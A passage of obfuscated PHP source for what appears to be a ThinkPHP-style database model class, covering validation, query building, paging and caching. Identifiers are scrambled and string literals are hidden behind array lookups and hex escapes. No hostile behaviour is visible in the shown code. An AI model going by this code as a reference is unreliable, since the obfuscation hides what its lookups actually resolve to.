think_lang(substr($©ÃΩ¨…õ[2], 2, -1)); } $©ÃΩ¨…õ[3] = isset($©ÃΩ¨…õ[3]) ? $©ÃΩ¨…õ[3] : THINK_EXISTS_VALIDATE; $©ÃΩ¨…õ[4] = isset($©ÃΩ¨…õ[4]) ? $©ÃΩ¨…õ[4] : $üêüÔÊµ[337]; switch ($©ÃΩ¨…õ[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($∆ŒÆ‘Ö∫, $©ÃΩ¨…õ)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($üêüÔÊµ[22] != trim($∆ŒÆ‘Ö∫[$©ÃΩ¨…õ[0]])) { if (!1 === $this->_validationField($∆ŒÆ‘Ö∫, $©ÃΩ¨…õ)) { return !1; } } break; default: if (isset($∆ŒÆ‘Ö∫[$©ÃΩ¨…õ[0]])) { if (!1 === $this->_validationField($∆ŒÆ‘Ö∫, $©ÃΩ¨…õ)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($˝›∂πüß, $º÷¨¥πØ) { if (!1 === $this->_validationFieldItem($˝›∂πüß, $º÷¨¥πØ)) { if ($this->patchValidate) { $this->error[$º÷¨¥πØ[0]] = $º÷¨¥πØ[2]; } else { $this->error = $º÷¨¥πØ[2]; return !1; } } return; } protected function _validationFieldItem($ÆÄ–®€™, $è±åæ∫∑) { $–ñãÇ”Ÿ =& $_SERVER[Á≈ ä ∞]; switch (strtolower(trim($è±åæ∫∑[4]))) { case $–ñãÇ”Ÿ[330]: case $–ñãÇ”Ÿ[331]: $…À˜®œø = isset($è±åæ∫∑[6]) ? (array) $è±åæ∫∑[6] : array(); if (is_string($è±åæ∫∑[0]) && strpos($è±åæ∫∑[0], $–ñãÇ”Ÿ[60])) { $è±åæ∫∑[0] = explode($–ñãÇ”Ÿ[60], $è±åæ∫∑[0]); } if (is_array($è±åæ∫∑[0])) { foreach ($è±åæ∫∑[0] as $˚€∆ìÚ∂) { $≥º¥Äüí[$˚€∆ìÚ∂] = $ÆÄ–®€™[$˚€∆ìÚ∂]; } array_unshift($…À˜®œø, $≥º¥Äüí); } else { array_unshift($…À˜®œø, $ÆÄ–®€™[$è±åæ∫∑[0]]); } if ($–ñãÇ”Ÿ[330] == $è±åæ∫∑[4]) { return call_user_func_array($è±åæ∫∑[1], $…À˜®œø); } else { return call_user_func_array(array(&$this, $è±åæ∫∑[1]), $…À˜®œø); } case $–ñãÇ”Ÿ[338]: return $ÆÄ–®€™[$è±åæ∫∑[0]] == $ÆÄ–®€™[$è±åæ∫∑[1]]; case $–ñãÇ”Ÿ[339]: if (is_string($è±åæ∫∑[0]) && strpos($è±åæ∫∑[0], $–ñãÇ”Ÿ[60])) { $è±åæ∫∑[0] = explode($–ñãÇ”Ÿ[60], $è±åæ∫∑[0]); } $Å©÷…“‘ = array(); if (is_array($è±åæ∫∑[0])) { foreach ($è±åæ∫∑[0] as $˚€∆ìÚ∂) { $Å©÷…“‘[$˚€∆ìÚ∂] = $ÆÄ–®€™[$˚€∆ìÚ∂]; } } else { $Å©÷…“‘[$è±åæ∫∑[0]] = $ÆÄ–®€™[$è±åæ∫∑[0]]; } if (!empty($ÆÄ–®€™[$this->getPk()])) { $Å©÷…“‘[$this->getPk()] = array($–ñãÇ”Ÿ[340], $ÆÄ–®€™[$this->getPk()]); } if ($this->where($Å©÷…“‘)->find()) { return !1; } return !0; default: return $this->check($ÆÄ–®€™[$è±åæ∫∑[0]], $è±åæ∫∑[1], $è±åæ∫∑[4]); } } public function check($‡·Ÿ´Å´, $¡ÉÊÈí¨, $éô°ñœ° = "\x72\x65\147\x65\x78") { $◊ñê†Ï  =& $_SERVER[Á≈ ä ∞]; $éô°ñœ° = strtolower(trim($éô°ñœ°)); switch ($éô°ñœ°) { case $◊ñê†Ï [17]: case $◊ñê†Ï [341]: $à∆ôΩü˚ = is_array($¡ÉÊÈí¨) ? $¡ÉÊÈí¨ : explode($◊ñê†Ï [60], $¡ÉÊÈí¨); return $éô°ñœ° == $◊ñê†Ï [17] ? in_array($‡·Ÿ´Å´, $à∆ôΩü˚) : !in_array($‡·Ÿ´Å´, $à∆ôΩü˚); case $◊ñê†Ï [342]: case $◊ñê†Ï [343]: if (is_array($¡ÉÊÈí¨)) { $ÇÒ”’∞¸ = $¡ÉÊÈí¨[0]; $Ù™–⁄–• = $¡ÉÊÈí¨[1]; } else { list($ÇÒ”’∞¸, $Ù™–⁄–•) = explode($◊ñê†Ï [60], $¡ÉÊÈí¨); } return $éô°ñœ° == $◊ñê†Ï [342] ? $‡·Ÿ´Å´ >= $ÇÒ”’∞¸ && $‡·Ÿ´Å´ <= $Ù™–⁄–• : $‡·Ÿ´Å´ < $ÇÒ”’∞¸ || $‡·Ÿ´Å´ > $Ù™–⁄–•; case $◊ñê†Ï [344]: case $◊ñê†Ï [345]: return $éô°ñœ° == $◊ñê†Ï [344] ? $‡·Ÿ´Å´ == $¡ÉÊÈí¨ : $‡·Ÿ´Å´ != $¡ÉÊÈí¨; case $◊ñê†Ï [346]: $•ÿ∑†–∞ = mb_strlen($‡·Ÿ´Å´, $◊ñê†Ï [347]); if (strpos($¡ÉÊÈí¨, $◊ñê†Ï [60])) { list($ÇÒ”’∞¸, $Ù™–⁄–•) = explode($◊ñê†Ï [60], $¡ÉÊÈí¨); return $•ÿ∑†–∞ >= $ÇÒ”’∞¸ && $•ÿ∑†–∞ <= $Ù™–⁄–•; } else { return $•ÿ∑†–∞ == $¡ÉÊÈí¨; } case $◊ñê†Ï [348]: list($‘∫¸ü¬Â, $ºΩ⁄‡Óô) = explode($◊ñê†Ï [60], $¡ÉÊÈí¨); if (!is_numeric($‘∫¸ü¬Â)) { $‘∫¸ü¬Â = strtotime($‘∫¸ü¬Â); } if (!is_numeric($ºΩ⁄‡Óô)) { $ºΩ⁄‡Óô = strtotime($ºΩ⁄‡Óô); } return NOW_TIME >= $‘∫¸ü¬Â && NOW_TIME <= $ºΩ⁄‡Óô; case $◊ñê†Ï [349]: return in_array(get_client_ip(), explode($◊ñê†Ï [60], $¡ÉÊÈí¨)); case $◊ñê†Ï [350]: return !in_array(get_client_ip(), explode($◊ñê†Ï [60], $¡ÉÊÈí¨)); case $◊ñê†Ï [337]: default: return $this->regex($‡·Ÿ´Å´, $¡ÉÊÈí¨); } } public function query($Ò¡äíõÚ, $ÈÈÚ¶πã = false) { $ÊÎÌà˙Œ =& $_SERVER[Á≈ ä ∞]; if (!is_bool($ÈÈÚ¶πã) && !is_array($ÈÈÚ¶πã)) { $ÈÈÚ¶πã = func_get_args(); array_shift($ÈÈÚ¶πã); } $Ò¡äíõÚ = str_replace(array($ÊÎÌà˙Œ[11], $ÊÎÌà˙Œ[351]), $ÊÎÌà˙Œ[63], $Ò¡äíõÚ); $Ò¡äíõÚ = $this->parseSql($Ò¡äíõÚ, $ÈÈÚ¶πã); return $this->db->query($Ò¡äíõÚ); } public function execute($≠Ê≠˚Œ±, $¢œÔéÁå = false) { if (!is_bool($¢œÔéÁå) && !is_array($¢œÔéÁå)) { $¢œÔéÁå = func_get_args(); array_shift($¢œÔéÁå); } $≠Ê≠˚Œ± = $this->parseSql($≠Ê≠˚Œ±, $¢œÔéÁå); return $this->db->execute($≠Ê≠˚Œ±); } protected function parseSql($π˛áü¥, $Ä≤é˘Ø•) { $âÁı®√Î =& $_SERVER[Á≈ ä ∞]; if (!0 === $Ä≤é˘Ø•) { $ÔÙ÷î¢è = $this->_parseOptions(); $π˛áü¥ = $this->db->parseSql($π˛áü¥, $ÔÙ÷î¢è); } elseif (is_array($Ä≤é˘Ø•)) { $Ä≤é˘Ø• = array_map(array($this->db, $âÁı®√Î[352]), $Ä≤é˘Ø•); $π˛áü¥ = vsprintf($π˛áü¥, $Ä≤é˘Ø•); } else { $π˛áü¥ = strtr($π˛áü¥, array($âÁı®√Î[353] => $this->getTableName(), $âÁı®√Î[354] => think_config($âÁı®√Î[253]))); } $this->db->setModel($this->name); return $π˛áü¥; } public function db($¨Éø‘Ò´ = '', $¨Û±Ø‰… = '', $è§–∂Ω« = array()) { $ôÂŸ˜´µ =& $_SERVER[Á≈ ä ∞]; if ($ôÂŸ˜´µ[22] === $¨Éø‘Ò´ && $this->db) { return $this->db; } static $ÚÓöÿ¿ÿ = array(); static $¬∆ﬂÃ·´ = array(); if (!isset($¬∆ﬂÃ·´[$¨Éø‘Ò´]) || isset($¬∆ﬂÃ·´[$¨Éø‘Ò´]) && $¨Û±Ø‰… && $ÚÓöÿ¿ÿ[$¨Éø‘Ò´] != $¨Û±Ø‰…) { if (!empty($¨Û±Ø‰…) && is_string($¨Û±Ø‰…) && !1 === strpos($¨Û±Ø‰…, $ôÂŸ˜´µ[18])) { $¨Û±Ø‰… = think_config($¨Û±Ø‰…); } $¨Éø‘Ò´ = think_guid($¨Û±Ø‰…); $¬∆ﬂÃ·´[$¨Éø‘Ò´] = Db::getInstance($¨Û±Ø‰…); } elseif (NULL === $¨Û±Ø‰…) { $¬∆ﬂÃ·´[$¨Éø‘Ò´]->close(); unset($¬∆ﬂÃ·´[$¨Éø‘Ò´]); return; } if (!empty($è§–∂Ω«)) { if (is_string($è§–∂Ω«)) { parse_str($è§–∂Ω«, $è§–∂Ω«); } foreach ($è§–∂Ω« as $÷ËÖÖ‰’ => $õﬂ–”œô) { $this->setProperty($÷ËÖÖ‰’, $õﬂ–”œô); } } $ÚÓöÿ¿ÿ[$¨Éø‘Ò´] = $¨Û±Ø‰…; $this->db = $¬∆ﬂÃ·´[$¨Éø‘Ò´]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $æŸ‡ç˘ö = get_class($this); if ($æŸ‡ç˘ö == $_SERVER[Á≈ ä ∞][355]) { return $this->name; } $this->name = substr($æŸ‡ç˘ö, 0, -5); } return $this->name; } public function getTableName() { $¬õ∏π£° =& $_SERVER[Á≈ ä ∞]; if (empty($this->trueTableName)) { $û˚‡ò‚ã = !empty($this->tablePrefix) ? $this->tablePrefix : $¬õ∏π£°[22]; if (!empty($this->tableName)) { $û˚‡ò‚ã .= $this->tableName; } else { $û˚‡ò‚ã .= think_parse_name($this->name); } $this->trueTableName = strtolower($û˚‡ò‚ã); } return (!empty($this->dbName) ? $this->dbName . $¬õ∏π£°[20] : $¬õ∏π£°[22]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ﬁè´Äî€ =& $_SERVER[Á≈ ä ∞]; return isset($this->fields[$ﬁè´Äî€[260]]) ? $this->fields[$ﬁè´Äî€[260]] : $this->pk; } public function getDbFields() { $ˆüÆŒßñ =& $_SERVER[Á≈ ä ∞]; if (isset($this->options[$ˆüÆŒßñ[288]])) { $Ì¶…µ¡Ó = $this->db->getFields($this->options[$ˆüÆŒßñ[288]]); return $Ì¶…µ¡Ó ? array_keys($Ì¶…µ¡Ó) : !1; } if ($this->fields) { $Ì¶…µ¡Ó = $this->fields; unset($Ì¶…µ¡Ó[$ˆüÆŒßñ[259]], $Ì¶…µ¡Ó[$ˆüÆŒßñ[260]], $Ì¶…µ¡Ó[$ˆüÆŒßñ[261]], $Ì¶…µ¡Ó[$ˆüÆŒßñ[258]]); return $Ì¶…µ¡Ó; } return !1; } public function data($«ﬂÚ¨∏æ = '') { $‡¸ô†Ú— =& $_SERVER[Á≈ ä ∞]; if ($‡¸ô†Ú—[22] === $«ﬂÚ¨∏æ && !empty($this->data)) { return $this->data; } if (is_object($«ﬂÚ¨∏æ)) { $«ﬂÚ¨∏æ = get_object_vars($«ﬂÚ¨∏æ); } elseif (is_string($«ﬂÚ¨∏æ)) { parse_str($«ﬂÚ¨∏æ, $«ﬂÚ¨∏æ); } elseif (!is_array($«ﬂÚ¨∏æ)) { think_exception(think_lang($‡¸ô†Ú—[280])); } $this->data = $«ﬂÚ¨∏æ; return $this; } public function join($ú¥¸ñÒ¸) { $‰ÿÅªõ˙ =& $_SERVER[Á≈ ä ∞]; if (is_array($ú¥¸ñÒ¸)) { $this->options[$‰ÿÅªõ˙[291]] = $ú¥¸ñÒ¸; } elseif (!empty($ú¥¸ñÒ¸)) { $this->options[$‰ÿÅªõ˙[291]][] = $ú¥¸ñÒ¸; } return $this; } public function union($∞÷ ”é , $ÜáÁßÓ™ = false) { $ø—é≥ƒå =& $_SERVER[Á≈ ä ∞]; if (empty($∞÷ ”é )) { return $this; } if ($ÜáÁßÓ™) { $this->options[$ø—é≥ƒå[356]][$ø—é≥ƒå[357]] = !0; } if (is_object($∞÷ ”é )) { $∞÷ ”é  = get_object_vars($∞÷ ”é ); } if (is_string($∞÷ ”é )) { $µäëà«¿ = $∞÷ ”é ; } elseif (is_array($∞÷ ”é )) { if (isset($∞÷ ”é [0])) { $this->options[$ø—é≥ƒå[356]] = array_merge($this->options[$ø—é≥ƒå[356]], $∞÷ ”é ); return $this; } else { $µäëà«¿ = $∞÷ ”é ; } } else { think_exception(think_lang($ø—é≥ƒå[280])); } $this->options[$ø—é≥ƒå[356]][] = $µäëà«¿; return $this; } public function cache($„…¡Áﬂê = true, $˛ù–öû˚ = null, $ÍÕ°ÌôÁ = '') { $π’‡ë¯› =& $_SERVER[Á≈ ä ∞]; if (!1 !== $„…¡Áﬂê) { $this->options[$π’‡ë¯›[358]] = array($π’‡ë¯›[104] => $„…¡Áﬂê, $π’‡ë¯›[348] => $˛ù–öû˚, $π’‡ë¯›[43] => $ÍÕ°ÌôÁ); } return $this; } public function field($≥ Œ¨ú‹, $œ∏¬Ò§Ç = false) { $ÿÑ≥†∆œ =& $_SERVER[Á≈ ä ∞]; if (!0 === $≥ Œ¨ú‹) { $Û´≤»≈Ú = $this->getDbFields(); $≥ Œ¨ú‹ = $Û´≤»≈Ú ? $Û´≤»≈Ú : $ÿÑ≥†∆œ[198]; } elseif ($œ∏¬Ò§Ç) { if (is_string($≥ Œ¨ú‹)) { $≥ Œ¨ú‹ = explode($ÿÑ≥†∆œ[60], $≥ Œ¨ú‹); } $Û´≤»≈Ú = $this->getDbFields(); $≥ Œ¨ú‹ = $Û´≤»≈Ú ? array_diff($Û´≤»≈Ú, $≥ Œ¨ú‹) : $≥ Œ¨ú‹; } $this->options[$ÿÑ≥†∆œ[282]] = $≥ Œ¨ú‹; return $this; } public function scope($Ù‚Îƒùã = '', $§‰˙ßıÎ = NULL) { $Æú“·Üø =& $_SERVER[Á≈ ä ∞]; if ($Æú“·Üø[22] === $Ù‚Îƒùã) { if (isset($this->_scope[$Æú“·Üø[47]])) { $÷Ω ≠≠ª = $this->_scope[$Æú“·Üø[47]]; } else { return $this; } } elseif (is_string($Ù‚Îƒùã)) { $Ï“ÈÁé∂ = explode($Æú“·Üø[60], $Ù‚Îƒùã); $÷Ω ≠≠ª = array(); foreach ($Ï“ÈÁé∂ as $ÒéÈ⁄ÉÍ) { if (!isset($this->_scope[$ÒéÈ⁄ÉÍ])) { continue; } $÷Ω ≠≠ª = array_merge($÷Ω ≠≠ª, $this->_scope[$ÒéÈ⁄ÉÍ]); } if (!empty($§‰˙ßıÎ) && is_array($§‰˙ßıÎ)) { $÷Ω ≠≠ª = array_merge($÷Ω ≠≠ª, $§‰˙ßıÎ); } } elseif (is_array($Ù‚Îƒùã)) { $÷Ω ≠≠ª = $Ù‚Îƒùã; } if (is_array($÷Ω ≠≠ª) && !empty($÷Ω ≠≠ª)) { $this->options = array_merge($this->options, array_change_key_case($÷Ω ≠≠ª)); } return $this; } public function where($™©é∞…ﬁ, $–›√ÏÑ– = null) { $Ô€‰÷ê° =& $_SERVER[Á≈ ä ∞]; if (!is_null($–›√ÏÑ–) && is_string($™©é∞…ﬁ)) { if (!is_array($–›√ÏÑ–)) { $–›√ÏÑ– = func_get_args(); array_shift($–›√ÏÑ–); } $–›√ÏÑ– = array_map(array($this->db, $Ô€‰÷ê°[352]), $–›√ÏÑ–); $™©é∞…ﬁ = vsprintf($™©é∞…ﬁ, $–›√ÏÑ–); } elseif (is_object($™©é∞…ﬁ)) { $™©é∞…ﬁ = get_object_vars($™©é∞…ﬁ); } elseif (is_array($™©é∞…ﬁ)) { foreach ($™©é∞…ﬁ as $‚æÍﬁÊ¢ => $“öﬁ¶∏ÿ) { if ((is_numeric($‚æÍﬁÊ¢) || !$‚æÍﬁÊ¢) && is_string($“öﬁ¶∏ÿ)) { if (strpos($“öﬁ¶∏ÿ, $Ô€‰÷ê°[359]) === 0) { continue; } think_trace($Ô€‰÷ê°[360], $Ô€‰÷ê°[22], $Ô€‰÷ê°[59]); die; } } } if (is_string($™©é∞…ﬁ) && $Ô€‰÷ê°[22] != $™©é∞…ﬁ) { $⁄†Ë¢ÈÆ = array(); $⁄†Ë¢ÈÆ[$Ô€‰÷ê°[361]] = $™©é∞…ﬁ; $™©é∞…ﬁ = $⁄†Ë¢ÈÆ; } if (isset($this->options[$Ô€‰÷ê°[284]])) { $this->options[$Ô€‰÷ê°[284]] = array_merge($this->options[$Ô€‰÷ê°[284]], $™©é∞…ﬁ); } else { $this->options[$Ô€‰÷ê°[284]] = $™©é∞…ﬁ; } return $this; } public function limit($ï‰é˙—¡, $ ‹îÜ‚Ë = null) { $™ÑÇàá¶ =& $_SERVER[Á≈ ä ∞]; $this->options[$™ÑÇàá¶[301]] = is_null($ ‹îÜ‚Ë) ? $ï‰é˙—¡ : $ï‰é˙—¡ . $™ÑÇàá¶[60] . $ ‹îÜ‚Ë; return $this; } public function page($®ÚòØøÌ, $∑≠Ç†∑Å = null) { $Ω⁄ñﬂõÛ =& $_SERVER[Á≈ ä ∞]; $this->options[$Ω⁄ñﬂõÛ[362]] = is_null($∑≠Ç†∑Å) ? $®ÚòØøÌ : $®ÚòØøÌ . $Ω⁄ñﬂõÛ[60] . $∑≠Ç†∑Å; return $this; } public function comment($Üë¸åÆª) { $this->options[$_SERVER[Á≈ ä ∞][363]] = $Üë¸åÆª; return $this; } public function setProperty($œÚäÎﬂ∫, $π‚µ·ì®) { if (property_exists($this, $œÚäÎﬂ∫)) { $this->{$œÚäÎﬂ∫} = $π‚µ·ì®; } return $this; } } class ModelBase extends Model { const SQL_WHERE_IN_CHUNK = 2000; protected $dataAuto = array(array("\x6d\157\144\151\x66\171\124\x69\155\x65", "\x74\x69\x6d\x65", "\x69\156\x73\x65\x72\164\54\165\x70\x64\x61\164\145", "\x66\165\156\x63\164\x69\x6f\x6e"), array("\x63\162\145\141\x74\145\124\151\155\145", "\x74\x69\x6d\x65", "\x69\156\x73\x65\162\164", "\x66\165\156\143\x74\151\157\x6e")); public function setDataAuto($Á¿Ü»§˜) { $this->dataAuto = $Á¿Ü»§˜; } public function __construct($º›ë∞ÖÊ = '', $Ú‚πÄﬁ« = '', $ŒÈÒ™≠Õ = '') { parent::__construct($º›ë∞ÖÊ, $Ú‚πÄﬁ«, $ŒÈÒ™≠Õ); } protected $tableMeta = array(); protected function _beforeInsert(&$ÈíŸ¥º⁄, $®Ùïï“û) { $ƒØŒ¶ñƒ =& $_SERVER[Á≈ ä ∞]; if (!$this->checkDataAutoHas($ƒØŒ¶ñƒ[364])) { return; } $this->dataBeforeFilter($ÈíŸ¥º⁄, $ƒØŒ¶ñƒ[364]); } protected function _beforeUpdate(&$©úË∂É˙, $©úÊù‹¿) { $µ±”´í’ =& $_SERVER[Á≈ ä ∞]; if (!$this->checkDataAutoHas($µ±”´í’[365])) { return; } $this->dataBeforeFilter($©úË∂É˙, $µ±”´í’[365]); } protected function _afterSelect(&$õ∞˜¥«Ö, $ØÃœ∆¢©) { if (!is_array($õ∞˜¥«Ö)) { return; } if (!$this->checkDataAutoHas($_SERVER[Á≈ ä ∞][366])) { return; } foreach ($õ∞˜¥«Ö as &$Íé‰·ë£) { $this->dataAfterFilter($Íé‰·ë£); } unset($Íé‰·ë£); } protected function _afterFind(&$Ã®˛ƒ”Ú, $¬˛á¢¬©) { if (!is_array($Ã®˛ƒ”Ú)) { return; } if (!$this->checkDataAutoHas($_SERVER[Á≈ ä ∞][366])) { return; } $this->dataAfterFilter($Ã®˛ƒ”Ú); } public static function textEncode($¶àÉ™œ») { if (!$¶àÉ™œ») { return $¶àÉ™œ»; } $ÃÛ£øΩº = json_encode($¶àÉ™œ»); $ÃÛ£øΩº = preg_replace_callback($_SERVER[Á≈ ä ∞][367], function ($Ö∂¢⁄·Î) { return addslashes($Ö∂¢⁄·Î[0]); }, $ÃÛ£øΩº); return json_decode($ÃÛ£øΩº); } public static function textDecode($öüæ≥˜˘) { $ë®¥˘¥ˆ =& $_SERVER[Á≈ ä ∞]; $Ù‡áâôÀ = json_encode($öüæ≥˜˘); $Ù‡áâôÀ = preg_replace_callback($ë®¥˘¥ˆ[368], function ($Å‰∏∂ÜÑ) { return $_SERVER[Á≈ ä ∞][107]; }, $Ù‡áâôÀ); return json_decode($Ù‡áâôÀ); } public function setAutoIncrement($ì–ªÈ˙’) { $Ã†âûâª = array($this->getPk() => $ì–ªÈ˙’); $¯§Ä˘˚Ï = $this->data($Ã†âûâª)->add(); if ($¯§Ä˘˚Ï) { $this->delete($¯§Ä˘˚Ï); } } public function getAutoIncrement() { $—ÉèíÄù = $this->getTableName(); $≥€ë˛Œ§ = $this->max($this->getPk()); $•€√¥“† = $this->query("\x73\x68\157\167\x20\x74\x61\x62\154\145\x20\x73\x74\x61\x74\x75\x73\40\x77\150\x65\x72\145\x20\116\141\x6d\x65\x3d\x27{$—ÉèíÄù}\47"); $«ä¥∂è = $•€√¥“†[0][$_SERVER[Á≈ ä ∞][369]]; $ì„à§‹‹ = max($≥€ë˛Œ§, $«ä¥∂è); return $ì„à§‹‹; } protected function _callBefore($Ë—ó´ùÆ, $äÍ£¿ˆ˛) { return $this->cacheCallCheck($Ë—ó´ùÆ, $äÍ£¿ˆ˛, !1); } protected function _callAfter($›Ê¶±¶¶, $ûàÖ’¸ê) { return $this->cacheCallCheck($›Ê¶±¶¶, $ûàÖ’¸ê, !0); } protected function cacheFunctionAlias($Ä¿∑≠Ø) { return !1; } public function cacheMemory() { return $this->cache(null, 0); } protected function cacheCallCheck($…Ê¥ò„Æ, $†Èßü¸ÿ, $“ÿß∑«¯ = false) { $ËÉ‰œÛú = $this->cacheFunctionAlias($†Èßü¸ÿ); if (!$ËÉ‰œÛú) { return; } foreach ($ËÉ‰œÛú as $ôÿÀ¯™Å => $ø∂ßÊ¨‹) { $öùÇˆÁ‹ = $ø∂ßÊ¨‹[0]; $ßÌÃ’’ƒ = explode($_SERVER[Á≈ ä ∞][60], $ø∂ßÊ¨‹[1]); if ($…Ê¥ò„Æ == $ôÿÀ¯™Å) { return $this->cacheFunctionGet($ôÿÀ¯™Å, $öùÇˆÁ‹); } if ($“ÿß∑«¯ && in_array($…Ê¥ò„Æ, $ßÌÃ’’ƒ)) { $this->cacheFunctionClear($ôÿÀ¯™Å, $öùÇˆÁ‹); } } } public function cacheFunctionGet($¶˙˝“•¯, $ß°—ß¶˘) { $–¬ûŒ‰Ò = $this->cacheKeyMake($¶˙˝“•¯, $ß°—ß¶˘); $ãÔ¯ÙÈ© = Cache::get($–¬ûŒ‰Ò); if (!is_array($ãÔ¯ÙÈ©)) { $ãÔ¯ÙÈ© = call_user_func_array(array($this, $¶˙˝“•¯), array($ß°—ß¶˘, !0)); Cache::set($–¬ûŒ‰Ò, $ãÔ¯ÙÈ©); } return $ãÔ¯ÙÈ©; } public function cacheFunctionClear($’Ûûì◊‹, $ÒÄ∫…ç) { $ç‘™≥’Ù = $ÒÄ∫…ç; if (!is_array($ÒÄ∫…ç)) { $ç‘™≥’Ù = array($ÒÄ∫…ç); } foreach ($ç‘™≥’Ù as $Üí∫È‹Ü) { $ ˝˝É£æ = $this->cacheKeyMake($’Ûûì◊‹, $Üí∫È‹Ü); Cache::remove($ ˝˝É£æ); } } private function cacheKeyMake($“†ç„†í, $˚’∏’âÀ) { $åÔô»´¶ =& $_SERVER[Á≈ ä ∞]; return get_class($this) . $åÔô»´¶[21] . $“†ç„†í . $åÔô»´¶[370] . $˚’∏’âÀ; } protected function selectPageReset() { $±Ωîª˛≤ =& $_SERVER[Á≈ ä ∞]; if (isset($GLOBALS[$±Ωîª˛≤[371]])) { return; } $GLOBALS[$±Ωîª˛≤[371]] = isset($GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[372]]) ? $GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[372]] : !1; $GLOBALS[$±Ωîª˛≤[373]] = isset($GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[362]]) ? $GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[362]] : !1; $GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[372]] = !1; $GLOBALS[$±Ωîª˛≤[17]][$±Ωîª˛≤[362]] = !1; } protected function selectPageRestore() { $—¨àëƒı =& $_SERVER[Á≈ ä ∞]; if (!isset($GLOBALS[$—¨àëƒı[371]])) { return; } $GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[372]] = $GLOBALS[$—¨àëƒı[371]]; $GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[362]] = $GLOBALS[$—¨àëƒı[373]]; if ($GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[372]] === !1) { unset($GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[372]]); } if ($GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[362]] === !1) { unset($GLOBALS[$—¨àëƒı[17]][$—¨àëƒı[362]]); } unset($GLOBALS[$—¨àëƒı[371]]); unset($GLOBALS[$—¨àëƒı[373]]); } protected function selectPage($‚Ñ®íà¸ = 200, $€õÌÎÌò = 1) { $ªù„“”˘ =& $_SERVER[Á≈ ä ∞]; global $in; $¨˚‚πÁØ = $this->optionsValue(); $¥í”ä°© = 50000; $‚Ñ®íà¸ = isset($in[$ªù„“”˘[372]]) && $in[$ªù„“”˘[372]] ? $in[$ªù„“”˘[372]] : $‚Ñ®íà¸; if ($‚Ñ®íà¸ === -1) { $in[$ªù„“”˘[372]] = !1; $¥í”ä°© = 100000000; $‚Ñ®íà¸ = $¥í”ä°©; } $Ûæ®Í›™ = $¨˚‚πÁØ; $Ûæ®Í›™[$ªù„“”˘[374]] = array(); $‚Ñ®íà¸ = intval($‚Ñ®íà¸); $‚Ñ®íà¸ = $‚Ñ®íà¸ <= 5 ? 5 : ($‚Ñ®íà¸ >= $¥í”ä°© ? $¥í”ä°© : $‚Ñ®íà¸); $€õÌÎÌò = intval(isset($in[$ªù„“”˘[362]]) && $in[$ªù„“”˘[362]] ? $in[$ªù„“”˘[362]] : $€õÌÎÌò); $€õÌÎÌò = $€õÌÎÌò <= 1 ? 1 : $€õÌÎÌò; $˙ﬂ≈®›¡ = array(); $†‡≥ïË÷ = 1; if ($€õÌÎÌò == 1 && $†‡≥ïË÷) { $this->optionsValue($¨˚‚πÁØ); $˙ﬂ≈®›¡ = $this->page($€õÌÎÌò, $‚Ñ®íà¸)->select(); $Ö·ï∂¬Å = is_array($˙ﬂ≈®›¡) ? count($˙ﬂ≈®›¡) : 0; if ($Ö·ï∂¬Å < $‚Ñ®íà¸) { $¶¬°æ•° = 1; } else { $this->optionsValue($Ûæ®Í›™); $Ö·ï∂¬Å = intval($this->count()); $¶¬°æ•° = ceil($Ö·ï∂¬Å / $‚Ñ®íà¸); } } else { $this->optionsValue($Ûæ®Í›™); $Ö·ï∂¬Å = intval($this->count()); $¶¬°æ•° = ceil($Ö·ï∂¬Å / $‚Ñ®íà¸); $€õÌÎÌò = $€õÌÎÌò >= $¶¬°æ•° ? $¶¬°æ•° : $€õÌÎÌò; $this->optionsValue($¨˚‚πÁØ); $˙ﬂ≈®›¡ = $this->page($€õÌÎÌò, $‚Ñ®íà¸)->select(); } if (!is_array($˙ﬂ≈®›¡)) { $˙ﬂ≈®›¡ = array(); } if ($¶¬°æ•° == 1) { $Ö·ï∂¬Å = count($˙ﬂ≈®›¡); } $öâÅ∑œû = array($ªù„“”˘[375] => array($ªù„“”˘[376] => $Ö·ï∂¬Å, $ªù„“”˘[372] => $‚Ñ®íà¸, $ªù„“”˘[362] => $€õÌÎÌò, $ªù„“”˘[377] => $¶¬°æ•°), $ªù„“”˘[378] => $˙ﬂ≈®›¡); return $öâÅ∑œû; } protected function checkLength($È∂û‘Æ¸, $ÔÔ®û˛Î = 0, $›ƒßÑÇ‡ = '') { $â¢ã–¿Ö =& $_SERVER[Á≈ ä ∞]; $ÔÔ®û˛Î = $ÔÔ®û˛Î ? $ÔÔ®û˛Î : 65536; if (!$È∂û‘Æ¸ || strlen($È∂û‘Æ¸) < $ÔÔ®û˛Î) { return; } $›ƒßÑÇ‡ = $›ƒßÑÇ‡ ? $›ƒßÑÇ‡ . $â¢ã–¿Ö[81] : $â¢ã–¿Ö[22]; show_json($›ƒßÑÇ‡ . LNG($â¢ã–¿Ö[379]) . "\50{$ÔÔ®û˛Î}\51", !1); } protected function metaSet($ß£„çÖ†, $ΩûæÔ¶ü = null, $â¿ø¡ÿË = null) { $⁄⁄Ö€“ =& $_SERVER[Á≈ ä ∞]; if (!$this->tableMeta || !$ß£„çÖ†) { return !1; } $ôñË’ÈÎ = $this->tableMeta[$⁄⁄Ö€“[380]]; $æ˛©Á™° = $this->tableMeta[$⁄⁄Ö€“[381]]; $‹îüÎ¡Ï = Model($æ˛©Á™°); $æÇ∆∫º“ = array($ôñË’ÈÎ => $ß£„çÖ†, 